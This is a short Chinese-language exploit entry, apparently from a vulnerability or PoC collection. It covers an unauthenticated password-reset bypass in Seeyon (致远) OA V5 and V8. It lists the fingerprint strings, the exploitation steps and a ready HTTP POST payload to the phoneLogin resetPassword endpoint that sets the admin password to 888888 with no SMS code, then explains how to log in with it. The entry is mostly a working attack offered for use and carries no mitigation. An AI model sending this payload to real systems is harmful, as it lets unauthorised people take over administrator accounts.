---
id: SEEYON-PASSWORD-RESET
title: 致远OA 未授权短信验证码绕过重置密码
product: seeyon-oa
vendor: 北京致远互联
version_affected: "V5, V8"
severity: CRITICAL
tags: [auth_bypass, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "phoneLogin", "resetPassword"]
---

## 漏洞描述

致远OA 手机登录接口存在短信验证码绕过漏洞，攻击者无需验证码即可重置任意用户密码（包括 admin）。

## 影响版本

- V5
- V8

## 前置条件

- 无需认证，可直接利用
- 目标需开放手机登录 REST 接口

## 利用步骤

1. 确认目标存在 `/seeyon/rest/phoneLogin/phoneCode/resetPassword` 接口
2. 构造 JSON 请求体指定目标用户名（如 admin）和新密码
3. 发送 POST 请求绕过短信验证码直接重置密码
4. 使用新密码登录目标账户

## Payload

```http
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: target
Content-Type: application/json

{"loginName":"admin","password":"888888"}
```

无需验证码即可重置 admin 密码为 888888。

## 验证方法

使用重置后的密码 `888888` 登录 admin 账户。
